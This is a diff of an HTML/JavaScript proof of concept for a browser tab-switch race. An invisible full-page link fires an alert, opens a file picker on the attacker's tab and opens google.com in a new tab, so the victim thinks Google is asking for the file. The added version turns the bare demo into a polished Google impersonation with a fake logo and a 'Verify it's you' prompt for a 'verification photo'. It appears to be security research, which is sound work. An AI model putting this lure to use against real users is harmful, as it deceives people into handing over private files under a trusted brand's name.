@@ -1,46 +1,158 @@
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google Account Security</title>
+    <style>
+      /* Reset & Layout */
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        background-color: #f8f9fa;
+        color: #202124;
+        text-align: center;
+      }
 
-<style>
-  h1 {
-    margin: 1em;
-  }
+      .container {
+        padding: 30px;
+        max-width: 450px;
+        width: 90%;
+        background: white;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+      }
 
-  a {
-    position: absolute;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-  }
+      /* Google-style Logo */
+      .logo {
+        font-size: 28px;
+        font-weight: 600;
+        margin-bottom: 25px;
+      }
+      .g-blue {
+        color: #4285f4;
+      }
+      .g-red {
+        color: #ea4335;
+      }
+      .g-yellow {
+        color: #fbbc05;
+      }
+      .g-green {
+        color: #34a853;
+      }
 
-  input {
-    display: none;
-  }
+      h1 {
+        font-size: 24px;
+        font-weight: 500;
+        margin-bottom: 15px;
+      }
 
-  img {
-    width: 100%;
-  }
-</style>
+      p {
+        font-size: 16px;
+        line-height: 1.6;
+        margin-bottom: 30px;
+        color: #5f6368;
+      }
 
-<h1>Tap to upload photo to Google</h1>
+      /* The "Button" UI */
+      .btn-ui {
+        background-color: #1a73e8;
+        color: white;
+        padding: 12px 24px;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 500;
+        display: inline-block;
+        cursor: pointer;
+      }
 
-<!-- [poc-with-system-dialog]: -->
-<input id="fileSelect" type="file" accept="image/*" />
+      /* Invisible Trigger Overlay */
+      #link {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 9999; /* Ensure it stays on top */
+        cursor: pointer;
+        opacity: 0;
+      }
 
-<!-- [poc-with-camera]: -->
-<!-- <input id="fileSelect" type="file" accept="*/*" /> -->
+      input {
+        display: none;
+      }
 
-<img id="img" />
-<a id="link" target="_blank"></a>
+      #img {
+        margin-top: 25px;
+        max-width: 100%;
+        max-height: 200px;
+        border-radius: 4px;
+        display: none; /* Hidden until a file is selected */
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <span class="g-blue">G</span><span class="g-red">o</span
+        ><span class="g-yellow">o</span><span class="g-blue">g</span
+        ><span class="g-green">l</span><span class="g-red">e</span>
+      </div>
+      <h1>Verify it's you</h1>
+      <p>
+        To keep your account secure, Google needs to verify your identity. Tap
+        anywhere to upload a verification photo.
+      </p>
 
-<script>
-  link.onclick = () => {
-    alert();
-    fileSelect.click();
-    window.open("https://google.com");
-  };
+      <div class="btn-ui">Continue to Google</div>
 
-  fileSelect.onchange = (event) => {
-    img.src = URL.createObjectURL(fileSelect.files[0]);
-  };
-</script>
+      <img id="img" alt="Captured Content" />
+    </div>
+
+    <input id="fileSelect" type="file" accept="image/*" />
+    <a id="link" target="_blank"></a>
+
+    <script>
+      const fileSelect = document.getElementById("fileSelect");
+      const link = document.getElementById("link");
+      const img = document.getElementById("img");
+
+      link.onclick = (e) => {
+        // Step 1: Alert is used to synchronize the race condition on mobile
+        alert(
+          "System Action Required: Please select a photo to proceed with Google verification.",
+        );
+
+        // Step 2: Trigger file picker on the current (attacker) tab
+        fileSelect.click();
+
+        // Step 3: Open trusted site in a new tab
+        window.open("https://google.com", "_blank");
+      };
+
+      // Step 4: Capture the file when the victim interacts with the dialog
+      fileSelect.onchange = (event) => {
+        if (fileSelect.files.length > 0) {
+          img.src = URL.createObjectURL(fileSelect.files[0]);
+          img.style.display = "block";
+
+          // Success indicator for the researcher
+          console.log(
+            "Success! File captured from background tab:",
+            fileSelect.files[0].name,
+          );
+        }
+      };
+    </script>
+  </body>
+</html>
